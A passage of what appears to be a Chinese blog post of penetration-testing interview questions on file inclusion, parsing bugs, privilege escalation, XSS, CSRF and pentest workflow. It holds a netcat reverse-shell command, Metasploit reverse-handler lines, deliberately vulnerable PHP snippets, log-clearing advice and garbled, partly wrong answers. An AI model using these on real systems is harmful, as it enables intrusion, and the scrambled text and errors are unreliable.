截断的原理是什么？</h4><p>因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 </p><p>%00 是结束符号不会继续往后执⾏ </p><p>条件：PHP&lt;5.3.29，且 GPC 关闭 </p><h4 id="15、webshell-检测，有哪些⽅法"><a href="#15、webshell-检测，有哪些⽅法" class="headerlink" title="15、webshell 检测，有哪些⽅法"></a>15、webshell 检测，有哪些⽅法</h4><p>grep、关键词、关键函数 </p><p>安全狗、D 盾</p><p>的 本地包含 洞 什么 段带有 洞的代 ⼿ 的话如何发掘 如 报错 你 怎么16、php 的 LFI，本地包含漏洞原理是什么？写⼀段带有漏洞的代码。⼿⼯的话如何发掘？如果⽆报错回显，你是怎么 </p><p>遍历⽂件的？ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&#39;fifile&#39;])&#123; </span><br><span class="line"></span><br><span class="line">include $_GET[&#39;fifile&#39;]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包含的⽂件设置为变量，并且⽆过滤导致可以调⽤恶意⽂件 还可以对远程⽂件包含，但需要开启 allow_url_include = </p><p>ON 通过测试参数的地⽅进⾏本地⽂件 / etc/passwd 等包含 如何存在漏洞⽽且没有回显，有可能没有显示在⻚⾯⽽是 </p><p>在⽹⻚源代码中，除了些可以利⽤ DNSlog 进⾏获取包含的信息。从 index.php ⽂件⼀级级往读取 也可以利⽤ PHP 封 </p><p>装协议读取⽂件 </p><h4 id="17、说说常⻅的中间件解析漏洞利⽤⽅式"><a href="#17、说说常⻅的中间件解析漏洞利⽤⽅式" class="headerlink" title="17、说说常⻅的中间件解析漏洞利⽤⽅式"></a>17、说说常⻅的中间件解析漏洞利⽤⽅式</h4><p>IIS 6.0</p><p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p><p>IIS 7.0/7.5 </p><p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p><p>Nginx </p><p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 </p><p>空字节代码 xxx.jpg%00.php </p><p>Apache </p><p>上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p><p>的 户名密 存放在 张表 密 采 种加密⽅式18、mysql 的⽤户名密码是存放在那张表⾥⾯？mysql 密码采⽤哪种加密⽅式？ </p><p>mysql -&gt; users </p><p>SHA1 </p><h4 id="19、Windows、Linux、数据库的加固降权思路，任选其⼀"><a href="#19、Windows、Linux、数据库的加固降权思路，任选其⼀" class="headerlink" title="19、Windows、Linux、数据库的加固降权思路，任选其⼀"></a>19、Windows、Linux、数据库的加固降权思路，任选其⼀</h4><p>禁⽤ root </p><p>禁⽌远程访问 </p><p>禁⽌写⼊</p><p>单独帐号 </p><p>禁⽌执⾏ system 等函数 </p><h4 id="20、你使⽤什么⼯具来判断系统是否存在后⻔"><a href="#20、你使⽤什么⼯具来判断系统是否存在后⻔" class="headerlink" title="20、你使⽤什么⼯具来判断系统是否存在后⻔"></a>20、你使⽤什么⼯具来判断系统是否存在后⻔</h4><p>Chkrootkit </p><p>Rkhunter </p><h4 id="21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？"><a href="#21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？" class="headerlink" title="21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？"></a>21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？</h4><p>类似 phpinfo、⽹站信息 </p><p>C 段、⼦域名</p><p>历史解析记录 </p><p>DDOSzmap 全⽹扫描识别 http 头 </p><p>⽹站域名管理员邮箱，注册过的域名等相关信息关联 </p><h4 id="22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。"><a href="#22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。" class="headerlink" title="22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。"></a>22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。</h4><p>其实这是⼀个⾮常⼤的话题，渗透⼤部分思路都是如此，⽽⾯试官是想听到你回答不⼀样的答案让⼈眼前⼀亮 如何才做 </p><p>到让⼈眼前⼀亮都需要看你的经验，把你实践的过程拿出来说，以及遇到什么问题如何解决，最终取得成果 渗透其它⼤ </p><p>同⼩异, ⽽做为渗透者知识的储备、基础扎实、耐⼼、细⼼都是必不可少。 </p><h4 id="23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？"><a href="#23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？" class="headerlink" title="23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？"></a>23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？</h4><p>Windows </p><p>Windows 服务⽐较多所以⽅法也如此，最基本的就是 Exp 提权，数据库 SQLServer、MYSQL UDF 等、第三⽅软件提 </p><p>权。</p><p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。 </p><p>windows 权限提升 (⼆) </p><p>Linux </p><p>Linux 也是类似，除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器 </p><p>当跳版, </p><p>达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术。 </p><p>linux 权限提升 </p><p>Brief </p><p>枚举脚本以 root 权限运⾏的程序 </p><p>⽤户安装的软件 </p><p>弱⼝令或者明⽂密码 </p><p>只能内部访问的服务 </p><p>suid 和 guid 错误配置 </p><p>滥⽤ sudo 权限 </p><p>以 root 权限运⾏的脚本⽂件 </p><p>错误的路径配置 </p><p>计划任务 </p><p>未挂载的⽂件系统</p><p>NFS 共享</p><p>通过键盘记录仪窃取密码 </p><p>其它有⽤的和提权相关的东⻄ </p><p>内核提权 </p><h4 id="24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上"><a href="#24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上" class="headerlink" title="24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)"></a>24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)</h4><p>Tomcat </p><p>NginxApache </p><p>Hadhoop </p><p>Docker </p><p>Jenkins </p><p>Zenoss </p><p>Jboss </p><p>MongoDB </p><p>Redis </p><p>GlassFish </p><h4 id="25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h4><p>nc -lvvp 7777 -e /bin/bash </p><p>bash 是交互式, 否则像 useradd ⽆法执⾏交互</p><h4 id="26、CMD-命令⾏如何查询远程终端开放端⼝"><a href="#26、CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="26、CMD 命令⾏如何查询远程终端开放端⼝"></a>26、CMD 命令⾏如何查询远程终端开放端⼝</h4><p>tasklist /svc </p><p>netstat -ano </p><h4 id="27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路"><a href="#27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路" class="headerlink" title="27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路"></a>27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路</h4><p>可以读取 IIS 信息，知道路径, 如果像 WAMMP 类似构建，通过 @@datadir 知道数据库路径也可以猜测⽹站路径。或者直接写 Shell </p><h4 id="28、请写出-Mysql5-数据库中查询库表所有列名的语句"><a href="#28、请写出-Mysql5-数据库中查询库表所有列名的语句" class="headerlink" title="28、请写出 Mysql5 数据库中查询库表所有列名的语句"></a>28、请写出 Mysql5 数据库中查询库表所有列名的语句</h4><p>select COLUMN_NAME from information_schema.COLUMNS where table_name = ‘your_table_name’ and </p><p>table_schema = ‘your_db_name’; </p><h4 id="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"><a href="#29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤" class="headerlink" title="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"></a>29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤</h4><p><a href="http://www.exp.com/1.php">http://www.exp.com/1.php</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$s_func &#x3D; $_GET[&#39;s_func&#39;]; </span><br><span class="line"></span><br><span class="line">$info &#x3D; $_GET[&#39;info&#39;]; </span><br><span class="line"></span><br><span class="line">$s_func($info); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码执⾏, 通过 assert 调⽤ </p><h4 id="30、udf-提权"><a href="#30、udf-提权" class="headerlink" title="30、udf 提权"></a>30、udf 提权</h4><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果 </p><h4 id="31、SQL-头注⼊点"><a href="#31、SQL-头注⼊点" class="headerlink" title="31、SQL 头注⼊点"></a>31、SQL 头注⼊点</h4><p>UserAgent </p><p>Referer </p><p>CookieCookie </p><p>X-FOR-I </p><h4 id="32、php-中命令执⾏涉及到的函数"><a href="#32、php-中命令执⾏涉及到的函数" class="headerlink" title="32、php 中命令执⾏涉及到的函数"></a>32、php 中命令执⾏涉及到的函数</h4><p>eval() </p><p>assert() </p><p>system() </p><p>exec() </p><p>shell_exec() </p><h4 id="33、SSRF-漏洞的成因-防御-绕过"><a href="#33、SSRF-漏洞的成因-防御-绕过" class="headerlink" title="33、SSRF 漏洞的成因 防御 绕过"></a>33、SSRF 漏洞的成因 防御 绕过</h4><p>模拟服务器对其它资源进⾏请求 IP 探测，如果想漏洞利⽤必需要构造好 Payload 禁⽌跳转，限制协议，内外⽹限制， </p><p>URL 限制 针对 IP 格式 </p><h4 id="34、mysql-写-shell-有⼏种⽅法"><a href="#34、mysql-写-shell-有⼏种⽅法" class="headerlink" title="34、mysql 写 shell 有⼏种⽅法"></a>34、mysql 写 shell 有⼏种⽅法</h4><p>outfifile、dumpfifile、开启 log 写 webshell </p><h4 id="35、Metasploit-打开反向监听的命令"><a href="#35、Metasploit-打开反向监听的命令" class="headerlink" title="35、Metasploit 打开反向监听的命令"></a>35、Metasploit 打开反向监听的命令</h4><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp </p><h4 id="36、应急响应的步骤"><a href="#36、应急响应的步骤" class="headerlink" title="36、应急响应的步骤"></a>36、应急响应的步骤</h4><ol><li><p>准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘 </p></li><li><p>初步判断事件的类型 是被⼊侵 ddos 还是其它的原因2. 初步判断事件的类型，是被⼊侵、ddos 还是其它的原因  </p></li><li><p>⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。 </p></li><li><p>寻找原因，封堵攻击源。 </p></li><li><p>把业务恢复⾄正常⽔平 </p></li><li><p>监控有⽆异常，报告、管理环节的⾃省和改进措施。 </p></li></ol><h4 id="37、有哪些反向代理的⼯具"><a href="#37、有哪些反向代理的⼯具" class="headerlink" title="37、有哪些反向代理的⼯具?"></a>37、有哪些反向代理的⼯具?</h4><p>reGeirg、EW、lcx、Ngrok、frp </p><h4 id="38、有什么⽐较曲折的渗透经历"><a href="#38、有什么⽐较曲折的渗透经历" class="headerlink" title="38、有什么⽐较曲折的渗透经历"></a>38、有什么⽐较曲折的渗透经历</h4><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放 </p><p>弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。 </p><h4 id="39、怎么查找域控"><a href="#39、怎么查找域控" class="headerlink" title="39、怎么查找域控"></a>39、怎么查找域控</h4><p>⽅法有很多 </p><p>1.通过 DNS 查询 </p><p>dig -t SRV _gc._tcp.lab.ropnop.com </p><p>dig -t SRV _ldap._tcp.lab.ropnop.com </p><p>dig -t SRV _kerberos._tcp.lab.ropnop.com </p><p>dig -t SRV _kpasswd._tcp.lab.ropnop.com </p><p>2.端⼝扫描 </p><p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别。 </p><p>3.其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找。 </p><p>4.各种命令 </p><p>dsquery </p><p>net group “Domain controllers” </p><p>nltest /DCLIST:pentest.com </p><p>…… </p><h2 id="前端篇"><a href="#前端篇" class="headerlink" title="前端篇"></a>前端篇</h2><h4 id="1、什么是同源策略"><a href="#1、什么是同源策略" class="headerlink" title="1、什么是同源策略?"></a>1、什么是同源策略?</h4><p>源就是主机、协议、端⼝名的⼀个三元组 同源策略 (Same Origin Policy, SOP) 是 Web 应⽤程序的⼀种安全模型，被⼴ </p><p>泛地应⽤在处理 WEB 内容的各种客户端上，⽐如各⼤浏览器，微软的 Silverlight，Adobe 的 Flash/Acrobat 等等。 </p><h4 id="2、XSS-能⽤来做什么？"><a href="#2、XSS-能⽤来做什么？" class="headerlink" title="2、XSS 能⽤来做什么？"></a>2、XSS 能⽤来做什么？</h4><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍ </p><h4 id="3、XSS-的三种类型，防御⽅法"><a href="#3、XSS-的三种类型，防御⽅法" class="headerlink" title="3、XSS 的三种类型，防御⽅法"></a>3、XSS 的三种类型，防御⽅法</h4><p>反射型、Dom Base XSS、存储型 防御⽅法这个只能说个⼤概，毕竟这是⼀个⽐较⼤的话题，⽽且防御的⽅法还得看所 </p><p>在的业务等。从⽹络层、主机层、Web 层、数据库，通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可</p><p>以了，添加 CDN 只是让攻击成本增⾼，开启 HttpOnly，以防确实存在避免 cookies 被获取，CSP 策略、再就是语⾔中 </p><p>提供的函数对输⼊过滤，以及输出编码以及 ModSecurity 类的防⽕墙。 </p><h4 id="4、存储型-xss-原理"><a href="#4、存储型-xss-原理" class="headerlink" title="4、存储型 xss 原理?"></a>4、存储型 xss 原理?</h4><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触 </p><p>发漏洞。 </p><h4 id="5、你怎么理解-xss-攻击？"><a href="#5、你怎么理解-xss-攻击？" class="headerlink" title="5、你怎么理解 xss 攻击？"></a>5、你怎么理解 xss 攻击？</h4><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就 </p><p>能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。 </p><h4 id="6、如何快速发现-xss-位置？"><a href="#6、如何快速发现-xss-位置？" class="headerlink" title="6、如何快速发现 xss 位置？"></a>6、如何快速发现 xss 位置？</h4><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。 </p><h4 id="7、Dom-xss-原理-防范"><a href="#7、Dom-xss-原理-防范" class="headerlink" title="7、Dom xss 原理 / 防范"></a>7、Dom xss 原理 / 防范</h4><p>DOM 型 XSS 并不需要服务器解析响应的直接参与触发 XSS 靠的是浏览器 DOM 解析 DOM—based XSS 漏洞是基于⽂ </p><p>档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。 </p><p>cument.getElementById(“a”).innerHTML=”yyyyyy”; </p><p>在输⼊点过滤敏感关键字 </p><h4 id="8、DOM-型-XSS-与反射型-XSS-区别？"><a href="#8、DOM-型-XSS-与反射型-XSS-区别？" class="headerlink" title="8、DOM 型 XSS 与反射型 XSS 区别？"></a>8、DOM 型 XSS 与反射型 XSS 区别？</h4><p>DOM 型就是 JavaScript 中的 Document 对象 HTML 注⼊，直接浏览器处理。 </p><h4 id="9、如何使得前端-referer-为空"><a href="#9、如何使得前端-referer-为空" class="headerlink" title="9、如何使得前端 referer 为空"></a>9、如何使得前端 referer 为空</h4><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。 </p><h4 id="10、cookie-参数，security-⼲什么的"><a href="#10、cookie-参数，security-⼲什么的" class="headerlink" title="10、cookie 参数，security ⼲什么的"></a>10、cookie 参数，security ⼲什么的</h4><p>Httponly：防⽌ cookie 被 xss 偷https：防⽌ cookie 在⽹络中被偷 </p><p>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉 </p><p>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突 </p><h4 id="11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"><a href="#11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？" class="headerlink" title="11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"></a>11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</h4><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ fuzzing 测试。如果是存 </p><p>储型⻚⾯查找关键字。 </p><h4 id="12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法"><a href="#12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法" class="headerlink" title="12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法"></a>12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法</h4><p>CSRF 跨站请求伪造，构造已知的所有参数让对⽅访问, </p><p>防护 CSRF: 防御原理：不让你那么容易伪造请求 (cookie 中加⼊随机数，要求请求中带上，⽽攻击者获取不到 cookie </p><p>中的随机数, 验证 HTTP Referer 字段, 在请求地址中添加 takon 验证 </p><p>CRLF 原理: </p><p>HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（\r\n）的简称。 </p><p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP </p><p>内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 </p><p>Cookie 或者 HTML 代码，所以 CRLF Injection ⼜叫 HTTP Response Splitting，简称 HRS。 </p><h4 id="13、csrf-如何不带-referer-访问"><a href="#13、csrf-如何不带-referer-访问" class="headerlink" title="13、csrf 如何不带 referer 访问"></a>13、csrf 如何不带 referer 访问</h4><p>通过地址栏，⼿动输⼊；从书签⾥⾯选择；通过实现设定好的⼿势。上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 </p><p>CSRF。 </p><p>跨协议间提交请求。常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个</p><p>HTML ⻚⾯ 这个时候浏览器地址栏是 fifile:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求HTML ⻚⾯，这个时候浏览器地址栏是 fifile:// 开头的，如果这个 HTML ⻚⾯向任何 http 站点提交请求的话，这些请求 </p><p>的 Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀ </p><p>持的，我们可以换⽤ javascript: </p><h4 id="14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？"><a href="#14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？" class="headerlink" title="14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？"></a>14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？</h4><p>X-Frame-Options </p><p>DENY(禁⽌被 加载进任何 frame) </p><p>SAMEORIGIN(仅允许被加载进同域内的 frame) </p><p>X-XSS-Protection </p><p>0（表示禁⽌⽤这个策略） </p><p>1（默认，对危险脚本做⼀些标志或修改，以阻⽌在浏览器上熏染执⾏。） </p><p>1;mode=block（强制不熏染，在 Chrome 下直接跳转到空⽩⻚，在 IE 下返回⼀个 #符号） </p><p>这个策略仅针对反射型，对付不了存储型 XSS，能识别出反射型是因为提交请求的 URL 中带有可疑的 XSS 代码⽚段。 </p><p>X-Content-Security-Policy </p><h4 id="15、Xss-worm-原理"><a href="#15、Xss-worm-原理" class="headerlink" title="15、Xss worm 原理"></a>15、Xss worm 原理</h4><p>攻击者发现⽬标⽹站存在 XSS 漏洞，并且可以编写 XSS 蠕⾍。利⽤⼀个宿主（如博客空间）作为传播源头进⾏ XSS 攻 </p><p>击。</p><h4 id="16、Cookie-的-P3P-性质"><a href="#16、Cookie-的-P3P-性质" class="headerlink" title="16、Cookie 的 P3P 性质"></a>16、Cookie 的 P3P 性质</h4><p>HTTP 响应头的 p3 字段是 W3C 公布的⼀项隐私保护推荐标准，该字段⽤于标识是否允许⽬标⽹站的 cookie 被另⼀个</p><p>域通过加载⽬标⽹站⽽设置或发送，仅 IE 执⾏了该策略。17、CSRF 有何危害？ </p><p>篡改⽬标⽹站上的⽤户数据 盗取⽤户隐私数据 传播 CSRF 蠕 </p><h3 id="⼀、思路流程"><a href="#⼀、思路流程" class="headerlink" title="⼀、思路流程"></a>⼀、思路流程</h3><h4 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h4><p>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等） </p><p>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录 </p><p>c、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等） </p><p>e、⼦域名收集，旁站，C 段等 </p><p>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等 </p><p>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等 </p><p>h、传输协议，通⽤漏洞，exp，github 源码等 </p><h4 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h4><p>a、浏览⽹站，看看⽹站规模，功能，特点等 </p><p>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p><p>c、XSS，SQL 注⼊，上传，命令注⼊，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴⼒破解，任意⽂件上 </p><p>传，越权访问，未授权访问，⽬录遍历，⽂件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使⽤漏扫⼯具等 </p><h4 id="3、漏洞利⽤-amp-权限提升"><a href="#3、漏洞利⽤-amp-权限提升" class="headerlink" title="3、漏洞利⽤ &amp; 权限提升"></a>3、漏洞利⽤ &amp; 权限提升</h4><p>a mysql 提权 serv u 提权 oracle 提权a、mysql 提权，serv-u 提权，oracle 提权 </p><p>b、windows 溢出提权 </p><p>c、linux 脏⽜, 内核漏洞提权 e </p><h4 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据 &amp; 输出报告"></a>4、清除测试数据 &amp; 输出报告</h4><p>⽇志、测试数据的清理 </p><p>总结，输出渗透测试报告，附修复⽅案 </p><h4 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h4><p>验证并发现是否有新漏洞，输出报告，归档 </p><h3 id="⼆、问题"><a href="#⼆、问题" class="headerlink" title="⼆、问题"></a>⼆、问题</h3><h4 id="1、拿到⼀个待检测的站，你觉得应该先做什么？"><a href="#1、拿到⼀个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到⼀个待检测的站，你觉得应该先做什么？"></a>1、拿到⼀个待检测的站，你觉得应该先做什么？</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>a、获取域名的 whois 信息, 获取注册者邮箱姓名电话等，丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏ </p><p>登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出 </p><p>社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。 </p><p>b、查询服务器旁站以及⼦域名站点，因为主站⼀般⽐较难，所以先看看旁站有没有通⽤性的 cms 或者其他漏洞。 </p><p>c、查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞 </p><p>d、查看 IP，进⾏ IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p><p>e、扫描⽹站⽬录结构，看看是否可以遍历⽬录，或者敏感⽂件泄漏，⽐如 php 探针 </p><p>f、google hack 进⼀步探测⽹站的信息，后台，敏感⽂件 </p><h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>开始检测漏洞 如 XSS XSRF sql 注⼊ 代码执⾏ 命令执⾏ 越权访问 ⽬录读取 任意⽂件读取 下载 ⽂件包含开始检测漏洞，如 XSS,XSRF,sql 注⼊，代码执⾏，命令执⾏，越权访问，⽬录读取，任意⽂件读取，下载，⽂件包含， </p><p>远程命令执⾏，弱⼝令，上传，编辑器漏洞，暴⼒破解等 </p><h5 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h5><p>利⽤以上的⽅式拿到 webshell，或者其他权限 </p><h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>提权服务器，⽐如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴⻄烤⾁，linux </p><p>脏⽜漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 </p><h5 id="⽇志清理"><a href="#⽇志清理" class="headerlink" title="⽇志清理"></a>⽇志清理</h5><h5 id="总结报告及修复⽅案"><a href="#总结报告及修复⽅案" class="headerlink" title="总结报告及修复⽅案"></a>总结报告及修复⽅案</h5><h4 id="2、判断出⽹站的-CMS-对渗透有什么意义？"><a href="#2、判断出⽹站的-CMS-对渗透有什么意义？" class="headerlink" title="2、判断出⽹站的 CMS 对渗透有什么意义？"></a>2、判断出⽹站的 CMS 对渗透有什么意义？</h4><p>查找⽹上已曝光的程序漏洞。 </p><p>如果开源，还能下载相对应的源码进⾏代码审计。 </p><h4 id="3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？"><a href="#3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？" class="headerlink" title="3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？"></a>3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？</h4><p>敏感⽂件、⼆级⽬录扫描 </p><p>站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点 </p><h4 id="4-常⻅的⽹站服务器容器。"><a href="#4-常⻅的⽹站服务器容器。" class="headerlink" title="4.常⻅的⽹站服务器容器。"></a>4.常⻅的⽹站服务器容器。</h4><p>IIS、Apache、nginx、Lighttpd、Tomcat </p><h4 id="5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"><a href="#5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？" class="headerlink" title="5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"></a>5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？</h4><p>以 站的绝对路root 权限以及⽹站的绝对路径。 </p><h4 id="6-⽬前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-⽬前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.⽬前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.⽬前已知哪些版本的容器有解析漏洞，具体举例。</h4><p>a、IIS 6.0</p><p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p><p>b、IIS 7.0/7.5 </p><p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p><p>c、Nginx </p><p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。空字节代码 xxx.jpg.php </p><p>d、Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p><p>e、lighttpd xx.jpg/xx.php，不全, 请⼩伙伴们在评论处不吝补充，谢谢！ </p><ol start="7"><li><h4 